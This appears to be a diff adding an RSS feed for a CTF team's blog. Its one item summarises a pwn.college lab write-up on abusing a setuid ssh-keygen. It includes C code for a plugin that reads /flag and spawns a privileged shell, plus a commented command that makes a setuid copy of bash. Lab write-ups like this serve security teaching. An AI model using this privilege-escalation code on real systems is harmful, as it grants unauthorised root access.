@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Pwncolleges on gentlemen | CTFteam</title>
+    <link>https://ge.ntle.men/pwncollege/</link>
+    <description>Recent content in Pwncolleges on gentlemen | CTFteam</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 02 Nov 2022 10:13:52 +0800</lastBuildDate><atom:link href="https://ge.ntle.men/pwncollege/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Level51 General program suid lifting power ideas: ssh-keygen</title>
+      <link>https://ge.ntle.men/pwncollege/babysuidlevel51/</link>
+      <pubDate>Wed, 02 Nov 2022 10:13:52 +0800</pubDate>
+      
+      <guid>https://ge.ntle.men/pwncollege/babysuidlevel51/</guid>
+      <description>This challenge is part of a series of programs that show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!).
+I just set the SUID bit on /usr/bin/ssh-keygen. Try to use it to read the flag!
+Resolution Write 51.c program #include&amp;lt;stdio.h&amp;gt; #include&amp;lt;stdlib.h&amp;gt; static void inject() __attribute__((constructor)); void C_GetFunctionList(){ printf(&amp;#34;euid:%d\n&amp;#34;,geteuid()); sendfile(1,open(&amp;#34;/flag&amp;#34;,0),0,4096); //system(&amp;#34;cp /bin/bash /tmp/bash &amp;amp;&amp;amp; chmod +s /tmp/bash &amp;amp;&amp;amp; /tmp/bash -p&amp;#34;); char *argvv[]={&amp;#34;bash&amp;#34;,&amp;#34;-p&amp;#34;,NULL}; execvp(&amp;#34;/bin/bash&amp;#34;,argvv); } `output` consists of 41 seemingly random bytes: Compile and run with the -D parameter of ssh-keygen to.</description>
+    </item>
+    
+  </channel>
+</rss>
